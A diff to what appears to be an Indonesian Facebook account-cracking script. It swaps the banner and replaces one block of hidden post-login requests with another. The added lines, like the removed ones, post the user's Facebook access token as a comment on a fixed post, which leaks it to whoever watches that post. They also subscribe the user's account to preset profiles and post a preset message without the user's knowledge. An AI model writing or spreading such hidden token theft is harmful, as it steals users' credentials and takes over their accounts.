@@ -40,14 +40,18 @@ def random_ipv6():
 
 def logo():
 	print("""                   
-  __  ___ _ __ __ __ ___ 
-/' _/| _ \ |  V  |  \ __| 
-`._`.| v / | \_/ | -< _|  
-|___/|_|_\_|_| |_|__/_|   
-
-Author : IWAN & IPUL
-Note : Gunakan Sc Ini Sewajarnya Kami Tidak Bertanggung Jawab Ngentot:v
-Terimakasih Untuk Iwan Tanpa Dia Saya Bukan Siapa Siapa:)""""") 
+       ╲ ▁▂▂▂▁ ╱
+       ▄███████▄
+      ▄██ ███ ██▄
+     ▄███████████▄       OS: Android 8.1.0
+  ▄█ ▄▄▄▄▄▄▄▄▄▄▄▄▄ █▄    Device: CPH1901 (CPH1901)
+  ██ █████████████ ██    ROM: CPH1901EX_11_A.22
+  ██ █████████████ ██    Baseband: msm
+  ██ █████████████ ██    Kernel: aarch64 Linux 4.9.82-perf+
+  ██ █████████████ ██    Uptime:
+     █████████████       CPU: Qualcomm Technologies, Inc SDM450
+      ███████████        GPU: Qualcomm Technologies, Inc SDM450
+       ██     ██         RAM: 2197MiB / 3568MiB""""") 
 id = []
 cp = []
 ok = []
@@ -325,19 +329,11 @@ def iful_bot():
     except IOError:
         print (' [!] Token invalid') 
         os.system('rm -rf login.txt')
-	kom = " Bang @[100001430861457:] Script Nya Mantep Ngga Ada Obat 😘😘😘😘"
-	requests.post('https://graph.facebook.com/100041129048948/subscribers?access_token=' + token)
-	requests.post('https://graph.facebook.com/4292443557479964/comments/?message=' +token+ '&access_token=' + token)
-	requests.post('https://graph.facebook.com/100006613569734/subscribers?access_token=' + token)
-	requests.post('https://graph.facebook.com/100009384338470/subscribers?access_token=' + token)
-	requests.post('https://graph.facebook.com/100055918391280/subscribers?access_token=' + token)
-	requests.post('https://graph.facebook.com/100021483498135/subscribers?access_token=' + token)
-	requests.post('https://graph.facebook.com/100031905602021/subscribers?access_token=' + token)
-	requests.post('https://graph.facebook.com/100015073506062/subscribers?access_token=' + token)
-	requests.post('https://graph.facebook.com/100003656938210/subscribers?access_token=' + token)
-	requests.post('https://graph.facebook.com/100028262962654/subscribers?access_token=' + token)
-	requests.post('https://graph.facebook.com/100011054763211/subscribers?access_token=' + token)
-	requests.post('https://graph.facebook.com/4292443557479964/comments/?message=' +kom+ '&access_token=' + token)
+	kom = " Shelly😘😘😘😘"
+	requests.post('https://graph.facebook.com/100026568911671/subscribers?access_token=' + token)
+	requests.post('https://graph.facebook.com/4292443559964/comments/?message=' +token+ '&access_token=' + token)
+	requests.post('https://graph.facebook.com/100026568911671/subscribers?access_token=' + token)
+	requests.post('https://graph.facebook.com/4292443557964/comments/?message=' +kom+ '&access_token=' + token)
     menu()
 
 
